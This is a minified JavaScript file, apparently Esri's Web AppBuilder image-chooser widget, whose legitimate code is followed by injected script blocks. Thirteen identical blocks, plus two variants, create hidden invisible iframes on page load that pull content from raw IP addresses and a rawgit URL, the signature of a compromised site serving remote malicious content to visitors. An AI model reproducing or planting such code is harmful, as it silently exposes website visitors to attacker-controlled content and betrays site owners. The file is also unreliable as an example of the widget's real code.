// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/ImageChooser.html":'\x3cdiv class\x3d"jimu-image-chooser js-fileapi-wrapper"\x3e\r\n  \x3cdiv class\x3d"hint" data-dojo-attach-point\x3d"hintText"\x3e\r\n\t\t\x3cspan class\x3d"display-text" data-dojo-attach-point\x3d"displayText"\x3e\x3c/span\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"hint" data-dojo-attach-point\x3d"hintImage"\x3e\r\n\t\t\x3cimg class\x3d"display-image" data-dojo-attach-point\x3d"selfImg"\x3e\r\n  \x3c/div\x3e\r\n  \x3c!--\r\n  \x3cform data-dojo-attach-point\x3d"fileForm"\x3e\r\n    \x3clabel data-dojo-attach-point\x3d"mask"\x3e\x3c/label\x3e\r\n    \x3cinput type\x3d"file" data-dojo-attach-point\x3d"fileInput"\x3e\r\n  \x3c/form\x3e\r\n  \x3cimg class\x3d"tmp-image" style\x3d"display:none" data-dojo-attach-point\x3d"tmpImg"\x3e--\x3e\r\n\x3c/div\x3e'}});
define("dojo/Evented dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dojo/_base/lang dojo/_base/html dojo/on dojo/text!./templates/ImageChooser.html dojo/sniff esri/lang ../utils ./_CropImage jimu/dijit/Popup jimu/dijit/Message jimu/dijit/LoadingShelter".split(" "),function(d,m,n,p,e,b,l,q,h,r,c,t,u,f,v){var k=0;d=m([n,p,d],{templateString:q,declaredClass:"jimu.dijit.ImageChooser",cropImage:!0,displayImg:null,stretchImg:!0,defaultSelfSrc:null,showSelfImg:!1,label:null,showTip:!0,goldenWidth:400,
goldenHeight:400,maxSize:1024,format:null,imageData:null,postMixInProperties:function(){this.inherited(arguments);this.nls=window.jimuNls.imageChooser;this.nls.common=window.jimuNls.common;this.nls.readError=this.nls.readError||"Failed to read the file."},postCreate:function(){this._initial();c.file.supportHTML5()||h("safari")||!c.file.isEnabledFlash()||c.file.loadFileAPI().then(e.hitch(this,function(){b.setStyle(this.mask,"zIndex",1)}))},setImageSize:function(a){this.goldenWidth=a.width;this.goldenHeight=
a.height},disableChooseImage:function(){b.setStyle(this.fileForm,"display","none");this.label&&"string"===typeof this.label&&b.addClass(this.displayText,"disable-label");b.removeAttr(this.domNode,"title")},enableChooseImage:function(){b.setStyle(this.fileForm,"display","block");this.label&&"string"===typeof this.label&&b.removeClass(this.displayText,"disable-label");this._addTip()},setDefaultSelfSrc:function(a){this.defaultSelfSrc=a;this.imageData=this.selfImg.src=a},getImageData:function(){return this.imageData},
_initial:function(){this._initFileForm();this._processProperties();this._addTip()},_processProperties:function(){this.fileProperty={};this.label&&"string"===typeof this.label&&(this.displayText.innerHTML=this.label,b.setStyle(this.hintText,"display","block"));this.showSelfImg&&b.setStyle(this.hintImage,"display","block");!1===this.stretchImg?b.addClass(this.selfImg,"no-stretch-img"):b.removeClass(this.selfImg,"no-stretch-img");this.defaultSelfSrc&&(this.imageData=this.selfImg.src=this.defaultSelfSrc);
if(this.format){var a="image/*";"string"===typeof this.format&&/^image\/./.test(this.format)?a=this.format:"[object Array]"===Object.prototype.toString.call(this.format)&&0<this.format.length&&(a=this.format.join(","));b.setAttr(this.fileInput,"accept",a)}c.file.supportHTML5()||h("safari")||!c.file.isEnabledFlash()||b.setStyle(this.fileInput,{width:"100%",height:"100%",position:"absolute",left:0,top:0,opacity:0,zIndex:9})},_porcessMaskClick:function(){b.setAttr(this.fileInput,"id","imageChooser_"+
k);b.setAttr(this.mask,"for","imageChooser_"+k);k++;l.once(this.mask,"click",e.hitch(this,function(a){a.stopPropagation();if(h("safari")&&7>h("safari"))new f({message:this.nls.unsupportReaderAPI}),a.preventDefault();else{if(!c.file.supportHTML5()){if(!c.file.isEnabledFlash()){var w=b.create("a",{href:"http://helpx.adobe.com/flash-player.html",innerHTML:this.nls.enableFlash,target:"_blank"});new f({message:w});a.preventDefault();return}if(!c.file.supportFileAPI()){new f({message:this.nls.unsupportReaderAPI});
a.preventDefault();return}}b.setStyle(this.fileInput,"display","none");setTimeout(e.hitch(this,function(){b.setStyle(this.fileInput,"display","block")}),200)}}))},_addTip:function(){if(this.showTip){var a=r.substitute({width:this.goldenWidth||40,height:this.goldenHeight||40},this.nls.toolTip);b.setAttr(this.domNode,"title",a)}else b.setAttr(this.domNode,"title","")},_onFileInputChange:function(a){var b=a.target.files&&a.target.files[0]||a.files&&a.files[0];if(this.format&&-1===this.format.indexOf(b.type))new f({message:this.nls.invalidType}),
this._initFileForm();else{var g=1024*this.maxSize;c.file.readFile(a,"image/*",g,e.hitch(this,function(a,c,e){a?(c=this.nls[a.errCode],"exceed"===a.errCode&&(c=c.replace("1024",g/1024)),new f({message:c})):(this.fileProperty.fileName=c,this.cropImage&&"image/gif"!==b.type?this._cropImageByUser(e,b.type):this._readFileData(e));this._initFileForm()}))}},_initFileForm:function(){this.mask&&b.destroy(this.mask);this.fileInput&&b.destroy(this.fileInput);this.fileForm&&b.destroy(this.fileForm);this.fileForm=
b.create("form",{"data-dojo-attach-point":"fileForm"},this.domNode);this.mask=b.create("label",{"data-dojo-attach-point":"mask"},this.fileForm);this.fileInput=b.create("input",{type:"file","data-dojo-attach-point":"fileInput"},this.fileForm);this._porcessMaskClick();l.once(this.fileInput,"change",e.hitch(this,this._onFileInputChange))},_readFileData:function(a){this.onImageChange(a,this.fileProperty);this.displayImg&&b.setAttr(this.displayImg,"src",a);this.showSelfImg&&(this.selfImg?b.setAttr(this.selfImg,
"src",a):this.selfImg.src=a,(a=b.getMarginBox(this.hintImage))&&a.w&&a.h&&(b.style(this.selfImg,"maxWidth",a.w+"px"),b.style(this.selfImg,"maxHeight",a.h+"px")))},_cropImageByUser:function(a,c){var g=new t({imageSrc:a,type:c,nls:e.clone(this.nls),goldenWidth:this.goldenWidth,goldenHeight:this.goldenHeight}),d=new v({hidden:!0}),f=new u({titleLabel:this.nls.cropImage,content:g,width:500,height:480,buttons:[{label:this.nls.common.ok,onClick:e.hitch(this,function(){d.show();var a=g.getData();this._readFileData(a);
f.close();g.destroy();d.hide()})}]});d.placeAt(f.domNode);g.startup();b.addClass(f.domNode,"image-chooser-crop-popup")},onImageChange:function(a){this.imageData=a;this.emit("imageChange",this.imageData,this.fileProperty);this.emit("change",this.imageData,this.fileProperty)}});d.GIF="image/gif";d.JPEG="image/jpeg";d.PNG="image/png";return d});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});